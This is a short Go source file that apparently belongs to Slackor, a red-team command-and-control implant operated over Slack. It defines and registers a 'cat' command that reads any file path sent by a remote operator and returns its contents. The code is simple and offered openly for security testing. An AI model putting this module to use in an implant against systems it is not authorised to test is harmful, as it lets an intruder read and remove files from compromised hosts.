package common

import (
	"errors"
	"io/ioutil"
	"strings"

	"github.com/Coalfire-Research/Slackor/pkg/command"
)

// Cat prints the contents of the file
type Cat struct{}

// Name is the name of the command
func (c Cat) Name() string {
	return "cat"
}

// Run prints the contents of the file
func (c Cat) Run(clientID string, jobID string, args []string) (string, error) {
	if len(args) != 1 {
		return "", errors.New("cat takes 1 argument")
	}
	path := strings.Replace(args[0], "\"", "", -1)
	content, err := ioutil.ReadFile(path)
	if err != nil {
		return "", err
	}
	return string(content), nil
}

func init() {
	command.RegisterCommand(Cat{})
}
